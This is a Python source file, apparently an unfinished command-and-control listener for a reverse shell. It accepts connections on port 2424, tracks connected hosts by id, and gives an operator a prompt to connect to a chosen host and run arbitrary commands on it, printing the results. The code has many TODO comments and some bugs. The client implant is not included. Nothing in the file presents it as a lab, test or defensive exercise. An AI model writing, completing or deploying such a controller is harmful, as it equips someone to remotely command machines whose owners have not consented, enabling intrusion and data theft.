import socket
import threading
import time
import multiprocessing
import os


class SocketHandler:  # TODO COMPLETE REWORK
    def __init__(self, server_host, server_port):
        self.server_host = server_host
        self.server_port = server_port
        self.connection_list = []

    def handle(self):
        # create a socket object
        sock = socket.socket()
        # bind the socket to all IP addresses of this host
        sock.bind((self.server_host, self.server_port))
        sock.listen(5)
        while True:
            # accept any connections attempted
            client_sock, client_ip = sock.accept()
            current_client = ClientHandler(client_sock, client_ip)
            self.connection_list.append([current_client, None])

    def looker(self):
        __con_lst = []  # Private look up table
        while True:
            # Compare connection_list with expected connection
            if not __con_lst == self.connection_list:  # Todo handle this better (?event?)
                for i in range(len(self.connection_list)):
                    elem = self.connection_list[i]
                    if not __con_lst.__contains__(elem[0]):
                        # Todo make sure all thread are generated at the same place
                        elem[1] = threading.Thread(target=elem[0].handle).start()

                        __con_lst.append(elem[0])
                        self.connection_list[i] = elem


class ClientHandler:  # TODO COMPLETE REWORK

    def __init__(self, socket, ip):
        super(ClientHandler, self).__init__()
        self.ENCODING = 'utf-8'
        self.BUFFER_SIZE = 1024 * 128  # 128KB max size of messages, feel free to increase
        self.SEPARATOR = "<sep>"  # separator string for sending 2 messages in one go
        self.socket = socket
        self.ip = ip
        self.command = ''
        self.current_dir = ''
        self.last_response = ''

        self.id = None

    def handle(self):

        # receiving the current working directory of the client
        self.current_dir, self.id = self.socket.recv(self.BUFFER_SIZE) \
            .decode(encoding=self.ENCODING).split(self.SEPARATOR)

        while True:

            # command = input(f'{current_dir} $> ')
            if not self.command:  # look if a command have been push
                time.sleep(1)
                continue  # noting to do

            # send the command to the client...
            self.socket.send((self.command.encode()))
            if self.command.lower() == 'exit':
                break  # ...then if the command is exit, just break out of the loop

            # retrieve command results then split command output and current directory
            self.last_response, self.current_dir, self.id = self.socket.recv(self.BUFFER_SIZE) \
                .decode(encoding=self.ENCODING).split(self.SEPARATOR)

    def close(self):
        self.socket.close()  # close server connection


class Cli:  # TODO COMPLETE REWORK
    def __init__(self, sock_handler):
        self.sock_handler = sock_handler

    def handle(self):

        context_root = 'root'
        # Use as an indicator of connection...
        context_dir = ''  # ... TODO fix that
        mark = ' $> '

        while True:
            connection_list = self.sock_handler.connection_list  # TODO please find a better way, i hate this list

            #  seriously....
            cmd_arg = None
            cmd = input(f"{context_root} {context_dir}{mark}").strip()

            #  ... you really don't mind seeing your code ...
            if cmd in ['exit']:
                context_root = 'root'
                context_dir = ''
                continue
            # ... with a big hole like this ? ...

            if context_dir and not cmd[0:3] == 'run':
                cmd_arg = cmd
                cmd = 'run'
            else:
                cmd = cmd.split(' ', 1)
                if len(cmd) > 1:
                    cmd_arg = cmd[1]
                cmd = cmd[0]  # TODO fix that thing!

            if cmd in ['help', 'h']:
                self.print_help()
                continue

            if cmd in ['clear', 'cls']:
                self.clear()

            if cmd in ['list', 'lst', 'ls']:
                # TODO make connection_list look good
                for e in connection_list:
                    print(f'| {e[0].id} |')
                # TODO add query
                # TODO print heartbeat
                # TODO add info (os? uptime? ping?)

            if cmd in ['connect']:
                # I don't even want to comment that part
                if not cmd_arg:
                    print('ERROR : connect <id> --flag ')
                    continue

                arg_dic = {}
                if cmd_arg.strip()[0] != '-':
                    temp = cmd_arg.lstrip().split(' ', 1)
                    arg_dic['id'] = temp[0]
                    if len(temp) > 1:
                        cmd_arg = temp[1]
                    else:
                        cmd_arg = None
                if cmd_arg:
                    cmd_arg = cmd_arg.replace('--', '-')
                    for arg in cmd_arg.split('-'):
                        print('arg', arg)
                        if arg:
                            root_arg, tail_arg = arg.split(' ', 1)
                            arg_dic[root_arg] = tail_arg
                if arg_dic['id']:
                    for e in connection_list:
                        if e[0].id == arg_dic['id']:
                            context_root = e[0].id
                            context_dir = e[0].current_dir

                    if not context_dir:
                        context_root = 'root'
                        context_dir = ''
                        print(f'No active connection with id {arg_dic["id"]}')
                continue

            if cmd in ['run']:
                context_connection = None
                if context_root == 'root':
                    # TODO test arg to get id then remove the continue and else to utilize else code here

                    continue
                else:
                    # TODO keep stream open? or print last message? wait or continue?

                    # Get current connection from context
                    for elem in connection_list:
                        if elem[0].id == context_root:
                            context_connection = elem[0]  # Take make sure to ignore thread (elem[1] == thread)

                    # Clear last response
                    context_connection.last_response = ''
                    # Set command to be push
                    context_connection.command = cmd_arg

                    # TODO ...
                    wait_time = 0.25
                    time_out = 12*wait_time
                    while context_connection.last_response == '' and time_out > 0:
                        time_out = time_out - 1
                        time.sleep(0.25)
                    print(context_connection.last_response)
                    continue

    @staticmethod
    def clear():
        os.system('cls' if os.name in ('nt', 'dos') else 'clear')

    @staticmethod
    def print_help():
        pass


if __name__ == '__main__':
    multiprocessing.set_start_method('spawn', force=True)
    SERVER_HOST = "0.0.0.0"
    SERVER_PORT = 2424

    sock_handler = SocketHandler(server_host=SERVER_HOST, server_port=SERVER_PORT)
    cli_handler = Cli(sock_handler)

    # TODO handle thread in any other way seriously
    threading.Thread(target=sock_handler.looker).start()
    threading.Thread(target=sock_handler.handle).start()
    threading.Thread(target=cli_handler.handle).start()
